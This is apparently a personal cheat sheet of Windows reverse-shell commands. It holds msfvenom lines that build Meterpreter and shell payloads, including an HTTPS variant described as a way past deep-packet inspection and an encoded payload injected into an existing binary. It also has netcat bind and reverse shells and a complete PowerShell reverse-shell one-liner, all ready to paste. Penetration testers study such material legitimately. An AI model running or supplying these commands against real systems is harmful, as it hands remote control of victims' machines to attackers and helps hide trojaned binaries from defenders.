# Windows

## Standard Meterpreter

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```

## Meterpreter HTTPS

* makes the meterpreter traffic look normal
* since it is hidden in https the communication is encrypted and can be used to bypass deep-packet inspections

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.101 LPORT=443 -f exe -o met_https_reverse.exe
```

## Non-Staged Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe
use exploit/multi/handler
set payload windows/shell_reverse_tcp
```

## Staged Payload

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe
```

* must be caught with metasploit
* does not work with netcat

```bash
use exploit/multi/handler
set payload windows/shell/reverse_tcp
```

## Inject Payload into Binary

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x "/somebinary.exe" -o bad_binary.exe
```

## Netcat

### Bind Shell

```bash
nc.exe -nlvp 4444 -e cmd.exe
```

### Reverse Shell

```bash
nc -lvp 443
nc.exe 192.168.1.101 443 -e cmd.exe
```

## Power Shell

* first start a nc listener on the attacking machine
* connect to it with this command (change port and IP)

```bash
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## One-Liner Blog

* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)

